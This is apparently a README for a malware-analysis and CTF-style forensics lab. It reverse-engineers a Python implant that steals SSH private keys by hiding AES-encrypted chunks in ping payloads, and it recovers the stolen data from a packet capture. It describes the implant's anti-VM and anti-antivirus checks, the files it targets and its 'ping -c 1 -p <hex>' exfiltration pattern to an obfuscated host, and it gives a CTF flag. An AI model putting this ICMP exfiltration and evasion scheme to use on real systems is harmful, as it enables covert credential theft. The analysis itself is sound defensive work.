<h1 align="center">icmp-exfil-lab</h1>

<p align="center">
  <b>Reverse-engineering a Python malware sample and reconstructing an ICMP-encapsulated data exfiltration</b><br>
  Static analysis of a decompiled implant, network forensics on its traffic, and full recovery of the stolen data, block by block.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Type-Malware_Analysis_%2F_Forensics-6A1B9A?style=for-the-badge" alt="Malware analysis / forensics">
  <img src="https://img.shields.io/badge/Python-3.12-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.12">
  <img src="https://img.shields.io/badge/Scapy-pcap_parsing-005571?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/PyCryptodome-AES--128--CBC-C6282D?style=for-the-badge" alt="PyCryptodome AES-128-CBC">
  <img src="https://img.shields.io/badge/Sample-Analyzed_statically-2E7D32?style=for-the-badge" alt="Sample analyzed statically, never run outside a sandbox">
</p>

<p align="center">
  <a href="#overview">Overview</a> ·
  <a href="#skills-demonstrated">Skills demonstrated</a> ·
  <a href="#the-sample-nightshadepy">The sample</a> ·
  <a href="#recovery-methodology">Methodology</a> ·
  <a href="#usage">Usage</a> ·
  <a href="#results">Results</a> ·
  <a href="#disclaimer-and-responsible-use">Disclaimer</a>
</p>

## Overview

This project is a complete, end-to-end investigation of a simulated malware incident: a compiled Python
implant (`payload.pyc`) that quietly exfiltrates SSH private keys off a compromised host by hiding
encrypted data inside ordinary `ping` traffic. Starting from only the binary and a packet capture, the
goal was to answer three questions a defender would actually ask:

1. **What does the malware do?** — recovered by decompiling and statically analyzing the sample.
2. **Where does it send data?** — recovered by breaking the obfuscated destination field.
3. **What did it actually steal?** — recovered by reversing the encryption scheme and replaying it against
   every packet in the capture.

The result is a full, independently reproducible chain: *binary → source → encryption scheme → network
capture → recovered secret*, built entirely with custom tooling rather than off-the-shelf utilities.

## Skills demonstrated

| Area | What was done |
| :--- | :--- |
| **Reverse engineering** | Decompiled `payload.pyc` to Python source, read past deliberate obfuscation (base64-wrapped strings, single-letter names) to recover the real control flow |
| **Malware analysis** | Identified anti-VM and anti-AV evasion checks, the exfiltration trigger, target file list, and self-cleanup behavior |
| **Applied cryptography** | Recovered and validated a hardcoded AES-128-CBC key/IV, including PKCS#7 padding handling, and used it to both decrypt a hidden field and decrypt a live data stream |
| **Network forensics** | Parsed a raw `.pcap` with Scapy, isolated the relevant ICMP packets among hundreds, and mapped the malware's chunking scheme onto each packet's byte offsets |
| **Tooling / scripting** | Built small, single-purpose Python scripts (`decrypt_dst.py`, `inspect_icmp.py`, `decrypt_pcap.py`) instead of one monolithic script, each independently testable |

## The sample (`nightshade.py`)

```mermaid
flowchart TD
    A["nightshade.py<br/>(decompiled from payload.pyc)"] --> B{Anti-analysis checks}
    B -->|VM or AV/EDR detected| Z[Exit silently]
    B -->|Clean environment| C["Read target files<br/>/root/.secret, ~/.ssh/id_rsa, /root/.ssh/id_rsa"]
    C --> D["Split into 15-byte chunks"]
    D --> E["AES-128-CBC encrypt each chunk<br/>(hardcoded key/IV, PKCS#7 padding)"]
    E --> F["Hex-encode block"]
    F --> G["ping -c 1 -p &lt;hex&gt; &lt;target&gt;<br/>one ICMP echo request per block"]
    C --> H["Delete /root/.secret"]
```

| Aspect | Detail |
| :--- | :--- |
| **Anti-analysis (VM)** | Reads `/sys/class/dmi/id/product_name`, compares (via base64-encoded strings) against `VirtualBox`, `KVM`, `QEMU`, `Bochs` |
| **Anti-analysis (EDR/AV)** | Enumerates running processes with `psutil`, looks for `clamd`, `avgd`, `sophos`, `ESET`, `rkhunter` |
| **Encryption** | AES-128-CBC, key and IV hardcoded in the binary (`__k`, `__v`), PKCS#7 padding (`__p` / `__u`) |
| **Exfiltration targets** | `/root/.secret`, `~/.ssh/id_rsa`, `/root/.ssh/id_rsa` |
| **Exfiltration channel** | Data split into 15-byte chunks, each encrypted into a 16-byte block, hex-encoded, sent as the payload of a `ping -c 1 -p <hex> <dst>` |
| **Cleanup** | Deletes `/root/.secret` after the exfiltration attempt |
| **Destination** | The target host is itself AES-128-CBC encrypted with the same key (`__d`) — it has to be decoded before any network analysis makes sense |

## Recovery methodology

```mermaid
flowchart LR
    S["payload.pyc"] -->|PyLingual decompiler| N["nightshade.py"]
    N -->|extract key, IV, __d| T1["1. decrypt_dst.py"]
    T1 --> HOST["Target host:<br/>vastation.null"]
    CAP["capture_all.pcap<br/>(702 ICMP packets)"] -->|Scapy| T2["2. inspect_icmp.py"]
    T2 --> FMT["Confirms ping -p payload layout"]
    FMT --> T3["3. decrypt_pcap.py"]
    N -->|same key / IV| T3
    T3 --> OUT["recovered.txt<br/>(flag + OpenSSH private key)"]
```

1. **Decrypt the target host (`__d`)** — `decrypt_dst.py` reuses the sample's own key and IV to decrypt
   the single AES block stored in `__d`, revealing the plaintext hostname the malware was built to talk to.
2. **Inspect the ICMP packets** — `inspect_icmp.py` loads the capture with Scapy, keeps only ICMP packets
   carrying a payload, and prints the first few raw payloads to confirm how `ping -p` lays out its data
   (16-byte header/timestamp, then the repeating hex pattern).
3. **Decrypt every block and reconstruct the output** — `decrypt_pcap.py` filters ICMP echo requests
   (`type == 8`), extracts bytes 16–32 of each payload (the actual encrypted block), decrypts each one with
   AES-128-CBC, strips the PKCS#7 padding, and concatenates the result into a single file.

`test_first_block.py` is a minimal version of step 3 limited to the very first block — a quick sanity check
on the key and IV before trusting the full, 351-block reconstruction.

## Usage

### Prerequisites

```sh
python3 -m venv .venv
source .venv/bin/activate
pip install pycryptodome scapy psutil
```

### 1 — Decrypt the destination

```sh
python3 decrypt_dst.py
```

```text
Target: vastation.null
```

### 2 — Inspect the capture

```sh
python3 inspect_icmp.py capture_all.pcap
```

```text
Total ICMP packets with Raw payload: 702
[0] 192.168.1.5 -> 192.168.1.10 | len=56 | hex=dfa9e26700000000a2a8050000000000a08508333fbef26b26cd9e17100edf59a08508333fbef26b26cd9e17100edf59a08508333fbef26b
[1] 192.168.1.10 -> 192.168.1.5 | len=56 | hex=dfa9e26700000000a2a8050000000000a08508333fbef26b26cd9e17100edf59a08508333fbef26b26cd9e17100edf59a08508333fbef26b
[2] 192.168.1.5 -> 192.168.1.10 | len=56 | hex=dfa9e26700000000a8d30500000000008eef494a4028c635873e2b16293b0e7d8eef494a4028c635873e2b16293b0e7d8eef494a4028c635
[3] 192.168.1.10 -> 192.168.1.5 | len=56 | hex=dfa9e26700000000a8d30500000000008eef494a4028c635873e2b16293b0e7d8eef494a4028c635873e2b16293b0e7d8eef494a4028c635
[4] 192.168.1.5 -> 192.168.1.10 | len=56 | hex=dfa9e26700000000d3fc050000000000c1d24536d469f7cffac27bac054c66abc1d24536d469f7cffac27bac054c66abc1d24536d469f7cf
```

### 3 — Validate the first block

```sh
python3 test_first_block.py capture_all.pcap
```

```text
ICMP echo requests: 351
First block bytes: b'RM{986b8674b18e'
First block text : RM{986b8674b18e
```

### 4 — Reconstruct the exfiltrated data

```sh
python3 decrypt_pcap.py capture_all.pcap recovered.txt
```

```text
Decrypted 351 blocks -> saved 5249 bytes to recovered.txt
--- Preview ---
RM{986b8674b18e7f3c36b24cf8c8195b36bba01d61}
-----BEGIN OPENSSH PRIVATE KEY-----
[... truncated: a full OpenSSH private key follows in recovered.txt, generated locally for this lab ...]
-----END OPENSSH PRIVATE KEY-----
```

## Results

| Item | Value |
| :--- | :--- |
| ICMP packets analyzed | 702 (351 echo requests / 351 echo replies) |
| Blocks decrypted | 351 |
| Data recovered | 5,249 bytes |
| Recovered flag | `RM{986b8674b18e7f3c36b24cf8c8195b36bba01d61}` |
| Recovered secret | A full OpenSSH private key (kept out of this README — see note below) |

> `recovered.txt` and other generated files (`*.bin`, `*.txt`) are ignored by `.gitignore`. The full
> private key recovered here is deliberately left out of this README: publishing a complete private key,
> even a lab-generated one, adds nothing to the write-up and is simply bad habit to normalize.

## Repository layout

| Path | Contents |
| :--- | :--- |
| `nightshade.py` | Decompiled sample, statically analyzed |
| `payload.pyc` | Original compiled bytecode |
| `capture_all.pcap` | Network capture of the sandboxed execution |
| `decrypt_dst.py` | Decrypts the `__d` field (target host) |
| `inspect_icmp.py` | Lists and prints raw ICMP payloads from the capture |
| `test_first_block.py` | Decrypts only the first block, for quick validation |
| `decrypt_pcap.py` | Decrypts every block and reconstructs the exfiltrated data |
| `recovered.txt` | Output generated by `decrypt_pcap.py` (git-ignored) |

## Disclaimer and responsible use

This repository is a **reverse-engineering and forensic analysis exercise**, not an attack tool. The key,
IV and target host are those, already fixed, of the sample under study; nothing here generalizes the
technique to another system.

**Do**
- Analyze `nightshade.py` and `capture_all.pcap` in an isolated environment (sandbox, dedicated VM).
- Use the decryption scripts only on this sample and this capture, for learning, incident-response or CTF
  purposes.

**Don't**
- Run `nightshade.py` outside a disposable sandbox: it is an active malicious sample that reads and
  exfiltrates real SSH keys if they are present.
- Reuse the exfiltration mechanism (ICMP channel, encryption scheme) against a system you don't own or
  aren't explicitly authorized to test.
- Commit genuinely sensitive secrets recovered during the analysis (private keys, credentials).